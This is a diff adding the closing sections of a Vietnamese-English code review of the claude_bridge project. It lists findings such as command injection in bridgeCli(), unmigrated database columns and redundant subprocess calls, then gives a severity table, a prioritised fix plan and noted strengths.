+   Fix đề xuất: Thêm ("tasks", "reported", "INTEGER DEFAULT 0") vào migrations list.
+
+[R6] 🟡 MEDIUM — db.py: _migrate() dùng raw PRAGMA table_info — SQL injection risk ở đây
+   File: src/claude_bridge/db.py, line 136
+
+   Code:
+     cursor = self.conn.execute(f"PRAGMA table_info({table})")
+
+   Issue: `table` variable đến từ hardcoded dict keys {"tasks", "agents"} — safe.
+   Nhưng trong _migrate() loop (line 153-155):
+     self.conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {col_type}")
+
+   Tất cả đều hardcoded trong code — không phải user input. Không có actual risk.
+   Nhưng pattern không an toàn nếu ai extend migrations list với user data.
+
+   Annotation: False positive security risk — nhưng pattern đáng chú ý.
+
+[R7] 🟢 LOW — bridge-cli daemon logs (--lines) không implemented
+   File: src/claude_bridge/cli.py, _cmd_daemon() — chưa đọc phần logs
+
+   Let me check: daemon logs command được define (line 173-174):
+     dp = dsub.add_parser("logs", help="Show service log lines")
+     dp.add_argument("-n", "--lines", type=int, default=50, ...)
+
+   Nếu _cmd_daemon() handler cho "logs" chưa implement, user sẽ thấy error.
+   Risk: nếu logs command không implemented → UX issue mà không regression.
+
+[R8] 🟢 LOW — channel/lib.ts bridgeCli() gọi execSync("which bridge-cli") trong hot path
+   File: channel/lib.ts, lines 408-411
+
+   Code:
+     try {
+       execSync("which bridge-cli", { encoding: "utf8" });
+       cmd = `bridge-cli ${command} ${escapedArgs}`;
+     } catch {
+
+   Issue: Mỗi tool call từ Telegram sẽ spawn một "which bridge-cli" subprocess.
+   Với nhiều messages concurrent, đây là unnecessary overhead.
+
+   Fix đề xuất: Cache kết quả "which bridge-cli" lần đầu, reuse cho các lần sau.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  TỔNG KẾT — BẢNG ISSUES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
++------+----------+-------------------------------------------+-----------------------------------------+
+| ID   | Severity | Issue                                     | File                                    |
++------+----------+-------------------------------------------+-----------------------------------------+
+| S1   | CRITICAL | Command injection in bridgeCli()          | channel/lib.ts:405                      |
+| S2   | MEDIUM   | curl pipe bash (Bun install)              | install.sh:87                           |
+| S3   | MEDIUM   | CLAUDE_BRIDGE_HOME no path validation     | src/claude_bridge/__init__.py           |
+| S4   | MEDIUM   | Bot token plaintext in .mcp.json          | src/claude_bridge/cli.py:770            |
+| S5   | LOW      | Empty allowlist = allow all users         | channel/lib.ts:78                       |
+| S6   | LOW      | No write permission check for DB dir      | src/claude_bridge/db.py:117             |
+| S7   | LOW      | No log rotation in systemd service        | src/claude_bridge/daemon.py:56          |
+| E1   | CRITICAL | BridgeDB not closed on exception          | src/claude_bridge/cli.py (main)         |
+| E2   | CRITICAL | kill_process blocks 10 seconds            | src/claude_bridge/dispatcher.py:89      |
+| E3   | MEDIUM   | install.sh not atomic, no rollback        | install.sh                              |
+| E4   | MEDIUM   | daemon install fails silently in container| src/claude_bridge/daemon.py:96          |
+| E5   | MEDIUM   | doctor Telegram check no retry            | src/claude_bridge/cli.py:1409           |
+| E6   | MEDIUM   | dispatch race condition (check-then-act)  | src/claude_bridge/cli.py:287            |
+| E7   | MEDIUM   | update_task() dynamic SQL, no col valid   | src/claude_bridge/db.py:269             |
+| E8   | LOW      | validate_project_dir error msg not expand | src/claude_bridge/session.py:43         |
+| E9   | LOW      | CONFIG_PATH computed at import time       | src/claude_bridge/bridge_cmd.py:39      |
+| C1   | CRITICAL | install.sh hints broken on Fedora/Arch    | install.sh:66,108                       |
+| C2   | MEDIUM   | Bun not available on musl/Alpine Linux    | install.sh:87                           |
+| C3   | MEDIUM   | launchd "launchctl load" deprecated macOS | src/claude_bridge/daemon.py:254         |
+| C4   | MEDIUM   | PATH issues with pipx + systemd           | src/claude_bridge/daemon.py:44          |
+| C5   | MEDIUM   | "mcp>=1.0" dep but CLAUDE.md says stdlib  | pyproject.toml:13                       |
+| C6   | LOW      | WSL: tmux attach behavior unclear         | src/claude_bridge/bridge_cmd.py:199     |
+| C7   | LOW      | Python 3.10 excluded (Ubuntu 22.04 LTS)   | install.sh:64, pyproject.toml           |
+| Q1   | MEDIUM   | Config loading duplicated 7+ times        | src/claude_bridge/cli.py (multiple)     |
+| Q2   | MEDIUM   | cli.py 1700+ lines, violates SRP          | src/claude_bridge/cli.py                |
+| Q3   | MEDIUM   | Redundant datetime imports in methods     | src/claude_bridge/db.py:339,351         |
+| Q4   | MEDIUM   | _build_team_prompt hardcodes PYTHONPATH   | src/claude_bridge/cli.py:1134           |
+| Q5   | MEDIUM   | Naming inconsistency agent_file variants  | Multiple files                          |
+| Q6   | MEDIUM   | VALID_MODELS tuple duplicated             | src/claude_bridge/cli.py:197,948        |
+| Q7   | LOW      | Missing type hints on cmd_* args param    | src/claude_bridge/cli.py                |
+| Q8   | LOW      | cleanup() setTimeout dead code in server  | channel/server.ts:798                   |
+| R1   | CRITICAL | CONFIG_PATH stale if CLAUDE_BRIDGE_HOME   | src/claude_bridge/bridge_cmd.py:39      |
+| R2   | MEDIUM   | CLAUDE_BRIDGE_HOME change orphans data    | src/claude_bridge/session.py            |
+| R3   | MEDIUM   | Old config.json backward compat analysis  | src/claude_bridge/bridge_cmd.py         |
+| R4   | MEDIUM   | Channel server not auto-updated on upgrade| src/claude_bridge/cli.py:753            |
+| R5   | MEDIUM   | `reported` column missing from migrations | src/claude_bridge/db.py:143             |
+| R6   | LOW      | _migrate() uses f-string SQL (safe now)   | src/claude_bridge/db.py:136             |
+| R7   | LOW      | daemon logs command may not be implemented| src/claude_bridge/cli.py                |
+| R8   | LOW      | bridgeCli() spawns "which" on every call  | channel/lib.ts:408                      |
++------+----------+-------------------------------------------+-----------------------------------------+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  FIXES CẦN LÀM TRƯỚC KHI COMMIT (ưu tiên cao nhất)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+MUST FIX (Blocking — trước khi bất kỳ release nào):
+
+1. [S1] Fix command injection trong channel/lib.ts bridgeCli():
+   Thay execSync(shell string) bằng execFileSync('bridge-cli', [command, ...args]).
+   Đây là real security vulnerability có thể exploit được.
+
+2. [R5] Thêm "reported" vào _migrate() list trong db.py:
+   ("tasks", "reported", "INTEGER DEFAULT 0")
+   Không có cái này, users với old DB sẽ thấy "no such column: reported" khi
+   upgrade lên 0.2.0.
+
+3. [S4] Không hardcode bot token trong .mcp.json:
+   Dùng environment variable reference hoặc thêm .mcp.json vào .gitignore
+   warning. Hiện tại token được lưu plaintext trong file dễ bị git commit.
+
+4. [E6] Dispatch race condition:
+   Wrap check-then-spawn trong SQLite exclusive transaction để prevent
+   concurrent dispatches spawning 2 processes cho cùng agent.
+
+SHOULD FIX (Trước khi public release):
+
+5. [C1] install.sh Linux distro detection:
+   Thêm distro-aware package manager hints (dnf, pacman).
+
+6. [Q1] Extract config loading utility function:
+   Giảm code duplication, tập trung error handling.
+
+7. [Q6] Extract VALID_MODELS constant:
+   Module-level constant thay vì inline duplicate.
+
+8. [E2] kill_process() timeout reduction:
+   Reduce từ 10s xuống 3-5s, hoặc document expected blocking time.
+
+9. [S3] Validate CLAUDE_BRIDGE_HOME:
+   Reject /etc, /root, /usr, /bin paths. Resolve với realpath() để catch traversal.
+
+10. [Q8] Fix cleanup() race condition trong server.ts:
+    setTimeout → process.exit(1) sẽ không fire vì process.exit(0) chạy trước.
+    Cần await bot.stop() hoặc restructure cleanup logic.
+
+CAN DEFER (Nice to have):
+
+11. [C3] Update launchd to use launchctl bootstrap on macOS 12+
+12. [C2] Detect musl/Alpine before trying Bun install
+13. [E4] Better error message for daemon install in containers
+14. [Q2] Split cli.py into sub-modules (large refactor)
+15. [R4] Auto-redeploy channel server on upgrade via doctor --fix
+16. [R8] Cache "which bridge-cli" result in bridgeCli()
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ĐIỂM MẠNH (ghi nhận)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
++ db.py: WAL mode + foreign keys + CASCADE delete — đúng theo architecture doc
++ session.py: validate_agent_name() block double-dash đúng với session ID spec
++ dispatcher.py: start_new_session=True khi spawn — đúng per architecture rules
++ lib.ts: downloadTelegramFile() có pre-download size check và post-download verify
++ lib.ts: safeName() strip dangerous chars — good filename sanitization
++ server.ts: queuedNotification + flushPendingNotifications — prevent stdout
+  interleave với tool responses, design tốt
++ daemon.py: user service (--user flag) thay vì system service — không cần sudo
++ install.sh: idempotent git pull/skip node_modules — rerun friendly
++ .env.example: format rõ, không leak real values, có usage docs
++ session.py get_bridge_home() lazy import — tránh circular import issues
++ db.py _migrate(): migration-before-schema pattern đúng để avoid column-not-found
+  errors trong INDEX creation (mặc dù "reported" bị miss)
+
+================================================================================
+  End of Review
+================================================================================
